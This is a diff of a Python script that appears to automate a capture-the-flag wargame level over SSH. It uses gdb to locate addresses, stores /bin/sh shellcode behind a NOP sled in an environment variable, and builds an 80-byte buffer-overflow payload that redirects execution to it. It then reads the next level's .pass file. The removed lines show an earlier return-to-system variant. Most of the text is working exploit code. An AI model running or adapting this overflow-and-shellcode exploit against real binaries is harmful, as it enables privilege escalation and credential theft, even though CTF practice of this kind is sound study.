@@ -5,15 +5,13 @@ from utils.ssh import exec, connect_by_previous, exec_in_stream, exec_stream, up
 from utils.text import print_output, print_title
 from utils.base import save_token, transform_address
 
-from pwn import *
-
 client = connect_by_previous()
 
 files_list = exec(client, 'ls', title='Get files list')
 print_output(files_list, 'Files')
 print_title('Test this file')
 
-stream = exec_stream('./level1', title='Simple execute binary', stdin=True)
+stream = exec_stream('./level2', title='Simple execute binary', stdin=True)
 print_title('Okay, stdin intercepted, stdin write expected')
 
 output = exec_in_stream(stream, 'test', title='Send test in stdin')
@@ -31,54 +29,40 @@ print_title('Main call function `p`')
 
 p_structure = exec(client, 'echo "disass p" | gdb ./level2 -q', title='Get P structure')
 print_output(p_structure)
-print_title('Read stdin and print it')
+print_title('Read stdin and print it, check stack, if expression does not math, print address and exit')
 
-ret_address = exec(client, 'echo "disass p" | gdb ./level2 -q | grep ret', title='Get p return address')
+ret_address = exec(client, 'echo "disass main" | gdb ./level2 -q | grep ret', title='Get main return address')
 print_output(ret_address)
 ret_address = ret_address[0].split(' ', 1)[0]
 ret_address_transformed = transform_address(ret_address)
 
-system_address = exec(client, 'echo "b main\nr\ninfo func system" | gdb ./level2 -q | egrep "system$"',
-                      title='Get system func address')
-print_output(system_address)
-system_address = system_address[0].split(' ', 1)[0]
-system_address_transformed = transform_address(system_address)
+env_variable = 'shell_code'
+env_address = exec(
+    client, f'echo "b *main\nr\nx/200xs environ" | {env_variable}="test" gdb ./level2 -q | grep {env_variable}',
+    title=f'Get env {env_variable} address')
+print_output(env_address)
+env_address = env_address[0].split(':')[0]
+env_address_transformed = transform_address(env_address)
 
-upload_to('find_env.c')
-upload_to('transform.py')
+script = f'print "." * 80 + "{ret_address_transformed}" + "{env_address_transformed}"'
+stream = exec(
+    client, f"python -c '{script}' > /tmp/trick",
+    title='Write trick file to overflow buffer (return adddress + env address)')
 
-env_variable = 'SHELL'
-exec(client, f'gcc /tmp/find_env.c -o /tmp/find_env', title='Compile find env program')
+script = 'print "\\x90" * 1000 + "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89' \
+         '\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd' \
+         '\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh"'
+f = lambda command: f"export {env_variable}=$(python -c '{script}') && echo '{command}' | cat /tmp/trick - | ./level2"
 
+output = exec(
+    client, f("whoami"),
+    title='Export shellcode to env, it helps execute /bin/sh after overflow buffer via cat by our trick file')
+print_output(output, 'Current user')
+print_title('Got it! Check the password!')
 
-# exec(client, f"python -c '{script}' > /tmp/trick", title='Write exploit payload to file')
+token = exec(client, f("cat /home/user/level3/.pass"), title='Read .pass file')
 
-
-script = f'import os\n' \
-         f'import ctypes\n' \
-         f'libc = ctypes.CDLL("libc.so.6")\n' \
-         f'getenv = libc.getenv\n' \
-         f'getenv.restype = ctypes.c_voidp\n' \
-         f'env_address = "0x%08x" % getenv("{env_variable}")\n' \
-         f'command = "python /tmp/transform.py {{}}".format(env_address)\n' \
-         f'env_address_transformed = os.popen(command).read().strip()\n' \
-         f'print "a" * 80 + "{ret_address_transformed}" + "{system_address_transformed}" + "DUMM" + "{{}}".format(env_address_transformed.strip().decode("string-escape"))'
-
-
-stream = exec_stream(f"export SHELL=/bin/sh && python -c '{script}' > /tmp/trick && cat /tmp/trick - | ./level2", title='Read trick file and redirect stdout in binary',
-                     stdin=True, stderr=True, stdout=True)
-# script = f'import os\n' \
-#          f'command = "gcc /tmp/find_env.c -o /tmp/find_env"\n' \
-#          f'os.popen(command)\n' \
-#          f'command = "/tmp/find_env {env_variable}"\n' \
-#          f'env_address = os.popen(command).read().strip()\n' \
-#          f'command = "python /tmp/transform.py {{}}".format(env_address)\n' \
-#          f'print "." * 80 + "{ret_address_transformed}" + "{system_address_transformed}" + "...." + "{{}}".format(os.popen(command).readline().strip().decode("string-escape"))'
-
-
-a = exec_in_stream(stream, "cat /home/user/level3/.pass")
-print(a)
-
+save_token(token)
 
 
 
